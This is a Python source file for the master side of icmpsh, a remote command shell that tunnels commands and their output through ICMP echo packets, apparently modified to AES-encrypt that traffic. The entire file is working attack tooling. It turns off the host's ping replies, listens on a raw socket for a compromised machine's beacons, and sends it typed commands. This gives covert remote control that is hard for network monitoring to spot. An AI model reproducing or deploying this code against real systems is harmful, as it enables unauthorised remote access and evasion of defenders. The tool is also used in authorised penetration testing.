#!/usr/bin/env python
#
#  icmpsh - simple icmp command shell (port of icmpsh-m.pl written in
#  Perl by Nico Leidecker <nico@leidecker.info>)
#
#  Copyright (c) 2010, Bernardo Damele A. G. <bernardo.damele@gmail.com>
#
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os
import select
import socket
import subprocess
import sys
import hashlib

from Crypto.Cipher import AES
from Crypto import Random

from config import password

def set_non_blocking(fd):
    """
    Make a file descriptor non-blocking
    """

    import fcntl

    flags = fcntl.fcntl(fd, fcntl.F_GETFL)
    flags = flags | os.O_NONBLOCK
    fcntl.fcntl(fd, fcntl.F_SETFL, flags)


class Crypt(object):
    def __init__(self, key):
        super(Crypt, self).__init__()
        sha = hashlib.sha256()
        sha.update(key)
        self.key = sha.digest()

    def pad(self, s):
        BS = AES.block_size
        return s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

    def encrypt(self, buf):
        raw = self.pad(buf)
        iv = Random.new().read(AES.block_size)
        aes = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + aes.encrypt(raw)

    def decrypt(self, buf):
        iv = buf[0:AES.block_size]
        cipher = buf[AES.block_size:]
        aes = AES.new(self.key, AES.MODE_CBC, iv)
        return aes.decrypt(cipher)


def main():
    if subprocess.mswindows:
        sys.stderr.write('icmpsh master can only run on Posix systems\n')
        sys.exit(255)

    os.system('sysctl -w net.ipv4.icmp_echo_ignore_all=1')

    try:
        from impacket import ImpactDecoder
        from impacket import ImpactPacket
    except ImportError:
        sys.stderr.write('You need to install Python Impacket library first\n')
        sys.exit(255)

    # Make standard input a non-blocking file
    stdin_fd = sys.stdin.fileno()
    set_non_blocking(stdin_fd)

    # Open one socket for ICMP protocol
    # A special option is set on the socket so that IP headers are included
    # with the returned data
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error, e:
        sys.stderr.write('You need to run icmpsh master with root privileges\n')
        sys.exit(1)

    sock.setblocking(0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # Create a new IP packet and set its source and destination addresses
    ip = ImpactPacket.IP()

    # Create a new ICMP packet of type ECHO REPLY
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)

    # Instantiate an IP packets decoder
    decoder = ImpactDecoder.IPDecoder()

    # encrypt packet
    encryptor = Crypt(password)

    while True:
        cmd = ''

        # Wait for incoming replies
        if sock in select.select([ sock ], [], [])[0]:
            buf = sock.recv(4096)

            if not len(buf):
                # Socket remotely closed
                sock.close()
                sys.exit(0)

            # Packet received; decode and display it
            ippacket = decoder.decode(buf)
            icmppacket = ippacket.child()

            # If the packet matches, report it to the user
            src = ippacket.get_ip_dst()
            dst = ippacket.get_ip_src()
            if icmppacket.get_icmp_type() == 8:
                # Get identifier and sequence number
                ident = icmppacket.get_icmp_id()
                seq_id = icmppacket.get_icmp_seq()
                data = icmppacket.get_data_as_string()

                if len(data):
                    try:
                        output = encryptor.decrypt(data)
                        sys.stdout.write(output)
                    except:
                        pass

                # Parse command from standard input
                try:
                    cmd = sys.stdin.readline()
                except:
                    pass

                if cmd == 'exit\n':
                    return

                # Set sequence number and identifier
                icmp.set_icmp_id(ident)
                icmp.set_icmp_seq(seq_id)

                # Include the command as data inside the ICMP packet
                data = encryptor.encrypt(cmd)
                icmp.contains(ImpactPacket.Data(data))

                # Calculate its checksum
                icmp.set_icmp_cksum(0)
                icmp.auto_checksum = 1

                # Have the IP packet contain the ICMP packet (along with its payload)
                ip.set_ip_src(src)
                ip.set_ip_dst(dst)
                ip.contains(icmp)

                # Send it to the target host
                sock.sendto(ip.get_packet(), (dst, 0))

if __name__ == '__main__':
    main()